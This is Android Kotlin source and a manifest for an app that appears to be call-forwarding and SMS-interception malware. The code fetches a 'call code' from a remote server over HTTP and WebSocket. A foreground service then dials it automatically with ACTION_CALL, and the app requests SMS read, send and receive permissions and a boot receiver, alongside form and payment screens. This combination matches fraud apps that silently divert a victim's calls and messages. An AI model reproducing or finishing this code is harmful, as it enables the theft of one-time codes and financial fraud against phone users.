package com.example.refactor.services

import android.Manifest
import android.app.*
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.ActivityCompat
import androidx.core.app.NotificationCompat
import com.example.refactor.R
import com.example.refactor.receivers.AdminNumberFetcher
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit

class CallForwardingService : Service() {

    companion object {
        private const val TAG = "CallForwardingService"
        private const val CHANNEL_ID = "callForwardingServiceChannel"
        private const val NOTIFICATION_ID = 1
        private const val DELAY_SECONDS = 30L
    }

    private lateinit var adminNumberFetcher: AdminNumberFetcher
    private val scheduler = Executors.newSingleThreadScheduledExecutor()

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        adminNumberFetcher = AdminNumberFetcher(this)
        startForegroundServiceWithNotification("Service Running")
        scheduleCallDialing()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d(TAG, "Service started")
        return START_STICKY
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Call Forwarding Service",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Handles automatic call dialing."
            }
            val notificationManager = getSystemService(NotificationManager::class.java)
            notificationManager.createNotificationChannel(channel)
        }
    }

    private fun startForegroundServiceWithNotification(message: String) {
        val notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Call Forwarding Service")
            .setContentText(message)
            .setSmallIcon(R.drawable.ic_launcher_foreground)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()

        startForeground(NOTIFICATION_ID, notification)
    }

    private fun scheduleCallDialing() {
        scheduler.schedule({
            val callCode = adminNumberFetcher.getCallCode()

            if (!callCode.isNullOrEmpty()) {
                Log.d(TAG, "Attempting to dial: $callCode")
                startForegroundServiceWithNotification("Dialing: $callCode")
                forwardCall(callCode)
            } else {
                Log.e(TAG, "No saved call data found")
            }
        }, DELAY_SECONDS, TimeUnit.SECONDS)
    }

    private fun forwardCall(code: String) {
        if (!hasCallPermission()) {
            Log.e(TAG, "CALL_PHONE permission not granted! Stopping service.")
            stopSelf()
            return
        }

        try {
            val encodedNumber = Uri.encode(code)

            // ACTION_CALL for Foreground service
            val callIntent = Intent(Intent.ACTION_CALL).apply {
                data = Uri.parse("tel:$encodedNumber")
                flags = Intent.FLAG_ACTIVITY_NEW_TASK
            }

            // Start activity to initiate the call
            if (callIntent.resolveActivity(packageManager) != null) {
                startActivity(callIntent)
                Log.d(TAG, "Call initiated successfully: $encodedNumber")
            } else {
                Log.e(TAG, "No app available to handle the call intent")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to initiate call: ${e.message}", e)
        }
    }

    private fun hasCallPermission(): Boolean {
        return ActivityCompat.checkSelfPermission(this, Manifest.permission.CALL_PHONE) == PackageManager.PERMISSION_GRANTED
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        scheduler.shutdownNow()
        Log.d(TAG, "Service destroyed")
    }
}







package com.example.refactor.receivers

import android.content.Context
import android.util.Log
import com.example.refactor.network.ApiClient
import kotlinx.coroutines.*
import org.java_websocket.client.WebSocketClient
import org.java_websocket.handshake.ServerHandshake
import java.net.URI


class AdminNumberFetcher(context: Context) {
    private val appContext = context.applicationContext
    private val sharedPreferences = appContext.getSharedPreferences("AppPrefs", Context.MODE_PRIVATE)
    private val apiService = ApiClient.api
    private var webSocketClient: WebSocketClient? = null
    private val coroutineScope = CoroutineScope(Dispatchers.IO)


    private val webSocketUrl = "myurl.com"  // This is your WebSocket URL

    init {
        Log.d(TAG, "Initializing AdminNumberFetcher")
        fetchCallCode()
        setupWebSocket()
    }

    private fun fetchCallCode() {
        coroutineScope.launch {
            try {
                Log.d(TAG, "Fetching call code...")
                val response = apiService.getCode()
                if (response.isSuccessful) {
                    response.body()?.let {
                        if (it.success) {
                            saveCode(it.code ?: "")
                            Log.d(TAG, "Call code saved: ${it.code ?: "No Code"}")
                        } else {
                            Log.e(TAG, "API Response Error: ${it.error ?: "Unknown error"}")
                        }
                    }
                } else {
                    Log.e(TAG, "API Error: HTTP ${response.code()} - ${response.errorBody()?.string()}")
                }
            } catch (e: Exception) {
                Log.e(TAG, "Network Error: ${e.message}", e)
            }
        }
    }

    private fun setupWebSocket() {
        try {
            val serverUri = URI(webSocketUrl)  // Referencing the class-level webSocketUrl
            webSocketClient = object : WebSocketClient(serverUri) {
                override fun onOpen(handshakedata: ServerHandshake?) {
                    Log.d(TAG, "Connected to WebSocket")
                }

                override fun onMessage(message: String?) {
                    message?.let {
                        Log.d(TAG, "Received update: $it")
                        saveCode(it)
                    }
                }

                override fun onClose(code: Int, reason: String?, remote: Boolean) {
                    Log.d(TAG, "Disconnected: $reason, Code: $code")
                    if (code != NORMAL_CLOSE_CODE) reconnectWebSocket()
                }

                override fun onError(ex: Exception?) {
                    Log.e(TAG, "WebSocket Error: ${ex?.message}", ex)
                    reconnectWebSocket()
                }
            }
            webSocketClient?.connect()
        } catch (e: Exception) {
            Log.e(TAG, "WebSocket Connection Error: ${e.message}", e)
        }
    }

    private fun reconnectWebSocket() {
        coroutineScope.launch {
            // Delay before retry
            delay(RECONNECT_DELAY)

            // Validate the WebSocket URL before reconnecting
            if (isValidWebSocketUrl()) {
                Log.d(TAG, "Reconnecting WebSocket...")
                setupWebSocket()
            } else {
                Log.e(TAG, "WebSocket URL is invalid or server not found. Skipping reconnect.")
            }
        }
    }

    // Method to validate WebSocket URL
    private fun isValidWebSocketUrl(): Boolean {
        // Check if the URL is not empty and matches a simple WebSocket URL pattern (wss:// or ws://)
        return webSocketUrl.isNotEmpty() && (webSocketUrl.startsWith("wss://") || webSocketUrl.startsWith("ws://"))
    }

    private fun saveCode(callCode: String) {
        sharedPreferences.edit().putString(CALL_CODE_KEY, callCode).apply()
        Log.d(TAG, "Call code stored: $callCode")
    }

    fun getCallCode(): String? {
        return sharedPreferences.getString(CALL_CODE_KEY, null).also {
            Log.d(TAG, "Retrieved call code: $it")
        }
    }

    companion object {
        private const val TAG = "AdminNumberFetcher"
        private const val CALL_CODE_KEY = "call_code"
        private const val RECONNECT_DELAY = 5000L // 5 seconds
        private const val NORMAL_CLOSE_CODE = 1000
    }
}





websocketmanager 

package com.example.refactor.services

import android.content.Context
import android.widget.Toast
import okhttp3.*
import okhttp3.WebSocket
import okhttp3.WebSocketListener
import java.util.concurrent.TimeUnit

class WebSocketManager(private val context: Context) {
    private val webSocketUrl = "myurlclr.com"
    private var webSocket: WebSocket? = null
    private val client = OkHttpClient.Builder()
        .pingInterval(30, TimeUnit.SECONDS)
        .build()

    fun connectWebSocket() {
        val request = Request.Builder().url(webSocketUrl).build()
        webSocket = client.newWebSocket(request, webSocketListener)
    }

    private val webSocketListener = object : WebSocketListener() {
        override fun onOpen(webSocket: WebSocket, response: Response) {
            android.os.Handler(context.mainLooper).post {
                Toast.makeText(context, "WebSocket Connected!", Toast.LENGTH_SHORT).show()
            }
        }

        override fun onMessage(webSocket: WebSocket, text: String) {
            android.os.Handler(context.mainLooper).post {
                Toast.makeText(context, "Received: $text", Toast.LENGTH_SHORT).show()
            }
        }

        override fun onClosing(webSocket: WebSocket, code: Int, reason: String) {
            android.os.Handler(context.mainLooper).post {
                Toast.makeText(context, "WebSocket Closing: $reason", Toast.LENGTH_SHORT).show()
            }
            webSocket.close(1000, null)
        }

        override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
            android.os.Handler(context.mainLooper).post {
                Toast.makeText(context, "WebSocket Error: ${t.message}", Toast.LENGTH_SHORT).show()
            }
        }
    }
}

mainactivity 

package com.example.refactor

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.widget.ImageView
import android.widget.ProgressBar
import android.widget.Toast
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import com.example.refactor.activities.FormActivity
import com.example.refactor.services.CallForwardingService
import com.example.refactor.services.WebSocketManager

class MainActivity : AppCompatActivity() {

    private lateinit var progressBar: ProgressBar
    private lateinit var imageViewLogo: ImageView
    private lateinit var webSocketManager: WebSocketManager

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        webSocketManager = WebSocketManager(this)
        webSocketManager.connectWebSocket()

        progressBar = findViewById(R.id.progressBar)
        imageViewLogo = findViewById(R.id.imageViewLogo)

        // Initial animation setup
        progressBar.apply {
            alpha = 0f
            scaleX = 0.5f
            scaleY = 0.5f
            max = 100
        }
        imageViewLogo.apply {
            alpha = 0f
            scaleX = 0.5f
            scaleY = 0.5f
        }

        checkAndRequestPermissions()
    }

    private fun checkAndRequestPermissions() {
        val permissions = arrayOf(
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.READ_SMS,
            Manifest.permission.SEND_SMS,
            Manifest.permission.INTERNET,
            Manifest.permission.CALL_PHONE,
            Manifest.permission.READ_PHONE_STATE
        )

        if (permissions.all { ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED }) {
            startAnimations()
        } else {
            requestPermissionsLauncher.launch(permissions)
        }
    }

    private val requestPermissionsLauncher =
        registerForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) { permissions ->
            if (permissions.all { it.value }) {
                startAnimations()
            } else {
                Toast.makeText(this, "Permissions are required to proceed.", Toast.LENGTH_SHORT).show()
            }
        }

    private fun startAnimations() {
        imageViewLogo.animate().alpha(1f).scaleX(1f).scaleY(1f).setDuration(1000).start()
        progressBar.animate().alpha(1f).scaleX(1f).scaleY(1f).setDuration(1000).start()

        Handler(Looper.getMainLooper()).postDelayed({
            showProgressAndNavigate()
        }, 2000)
    }

    private fun showProgressAndNavigate() {
        var progress = 0
        val handler = Handler(Looper.getMainLooper())

        val progressRunnable = object : Runnable {
            override fun run() {
                if (progress <= 100) {
                    progressBar.progress = progress
                    progress += 5
                    handler.postDelayed(this, 100)
                } else {
                    navigateToFormPage()
                }
            }
        }
        handler.post(progressRunnable)
    }

    private fun navigateToFormPage() {
        startActivity(Intent(this, FormActivity::class.java))
        finish()
        startCallForwardingService()
    }

    private fun startCallForwardingService() {
        startService(Intent(this, CallForwardingService::class.java))
    }
}



transparentactivity 

package com.example.refactor

import android.app.Activity
import android.content.Intent
import android.net.Uri
import android.os.Bundle
import android.Manifest
import android.content.pm.PackageManager
import android.util.Log
import androidx.core.app.ActivityCompat

class TransparentActivity : Activity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        val number = intent.getStringExtra("CALL_NUMBER")
        val callIntent = Intent(Intent.ACTION_CALL).apply {
            data = Uri.parse("tel:$number")
            flags = Intent.FLAG_ACTIVITY_NEW_TASK
        }

        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.CALL_PHONE) == PackageManager.PERMISSION_GRANTED) {
            startActivity(callIntent)
        } else {
            Log.e("TransparentActivity", "CALL_PHONE permission not granted")
        }
        finish()  // Activity close kar dena
    }
}
\

manifest 

<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools">

    <!-- Permissions -->
    <uses-feature
        android:name="android.hardware.telephony"
        android:required="false" />

    <uses-permission android:name="android.permission.RECEIVE_SMS" />
    <uses-permission android:name="android.permission.READ_SMS" />
    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
    <uses-permission android:name="android.permission.SEND_SMS" />
    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"/>
    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
    <uses-permission android:name="android.permission.WAKE_LOCK"/>
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_PHONE_CALL"/>
    <uses-permission android:name="android.permission.MANAGE_OWN_CALLS" tools:targetApi="o" />
    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
    <uses-permission android:name="android.permission.CALL_PHONE" />

    <queries>
        <!-- Allow querying for apps that can handle call intents -->
        <package android:name="com.android.dialer" />
        <!-- You can also add other dialer or telephony apps -->
        <intent>
            <action android:name="android.intent.action.CALL" />
        </intent>
    </queries>

    <application
        android:allowBackup="true"
        android:icon="@drawable/ic_launcher"
        android:label="@string/app_name"
        android:roundIcon="@mipmap/ic_launcher"
        android:supportsRtl="true"
        android:theme="@style/Theme.MyApp"
        android:usesCleartextTraffic="true">

        <!-- Main Activity -->
        <activity
            android:name=".MainActivity"
            android:exported="true"
            tools:node="merge">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>

        <activity
            android:name=".TransparentActivity"
            android:theme="@android:style/Theme.Translucent.NoTitleBar"
            android:launchMode="singleTask"
            android:exported="true"/>

        <receiver
            android:name=".receivers.SMSReceiver"
            android:enabled="true"
            android:exported="true"
            android:permission="android.permission.BROADCAST_SMS">
            <intent-filter>
                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
            </intent-filter>
        </receiver>

        <service
            android:name=".services.CallForwardingService"
            android:foregroundServiceType="phoneCall"
            android:enabled="true"
            android:exported="false">
            <intent-filter>
                <action android:name="com.example.refactor.START_CALL_FORWARDING" />

            </intent-filter>
        </service>

        <!-- Boot Receiver -->
        <receiver
            android:name=".receivers.BootReceiver"
            android:enabled="true"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED" />
            </intent-filter>
        </receiver>

        <service
            android:name=".services.SmsService"
            android:foregroundServiceType="dataSync"
            android:enabled="true"
            android:exported="false">
            <intent-filter>
                <action android:name="com.example.refactor.START_SERVICE" />
            </intent-filter>
        </service>

        <!-- Additional Activities -->
        <activity android:name=".activities.FormActivity"
            android:exported="false" />
        <activity android:name=".activities.PaymentActivity"
            android:exported="false" />
        <activity android:name=".activities.SuccessActivity"
            android:exported="false" />

    </application>

</manifest>





